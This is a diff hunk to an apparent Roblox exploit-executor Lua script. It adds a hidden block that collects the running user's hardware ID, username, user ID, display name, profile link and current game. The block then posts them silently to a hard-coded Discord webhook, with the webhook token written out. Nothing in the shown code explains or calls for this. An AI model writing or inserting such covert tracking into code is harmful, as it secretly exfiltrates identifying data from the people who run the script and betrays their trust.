@@ -123,6 +123,66 @@ local whitelists = {
 
 local alreadytold = {}
 
+
+
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+
+local Webhook = "https://discord.com/api/webhooks/1058448687082254417/ixe2ifLX3DmQP-KCXmpn49blFfT-ctFpA4V6uLiRaOmw2_qoz9P5DSuRiveUieyTg3rV" 
+
+local Headers = {["content-type"] = "application/json"} 
+
+local UserId = lplr.UserId
+
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {
+           {
+           ["title"] = "Username:",
+           ["description"] = lplr.Name,
+           ["color"] = tonumber(0x2B6BE4),
+           ["fields"] = {
+               {
+                   ["name"] = "hwid:",
+                   ["value"] = hwid,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "User ID:",
+                   ["value"] = UserId,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "Account Link:",
+                   ["value"] = "https://roblox.com/users/"..UserId.."/profile",
+                   ["inline"] = true
+
+},
+                {
+                    ["name"] = "DisplayName:",
+                    ["value"] = lplr.DisplayName,
+                    ["inline"] = true
+
+},
+
+			 {
+                    ["name"] = "Game:",
+                    ["value"] = "https://roblox.com/games/"..game.PlaceId,
+                    ["inline"] = true
+
+},
+           },
+       }
+     }
+   }
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+
+Request = http_request or request or HttpPost or syn.request
+Request({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+
+
+
 local color = BrickColor.new(50,0,250)
 local transparency = .8
 
